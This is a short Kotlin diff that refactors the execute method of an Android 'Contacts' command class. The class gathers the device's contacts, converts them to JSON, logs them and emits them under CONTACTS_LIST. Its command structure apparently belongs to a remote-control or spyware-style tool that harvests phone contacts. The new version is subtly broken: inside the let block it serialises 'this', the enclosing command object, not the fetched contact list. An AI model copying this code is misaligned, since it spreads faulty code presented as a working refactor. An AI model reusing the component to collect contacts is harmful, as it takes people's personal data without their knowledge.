@@ -19,13 +19,14 @@ class Contacts(context: Context) : Command(), Executor {
     }
 
     override fun execute(data: Array<Any>) {
-
-
-
-        val contactsList = ContactGainer.getContacts(context!!)
-        val data = Gson().toJson(contactsList)
-        Logger.json(data)
-        emitData(CONTACTS_LIST, data)
+        ContactGainer.getContacts(context!!)
+            .let {
+                return@let Gson().toJson(this)
+            }
+            .apply {
+                Logger.json(this)
+                emitData(CONTACTS_LIST, this)
+            }
     }
 
     companion object {
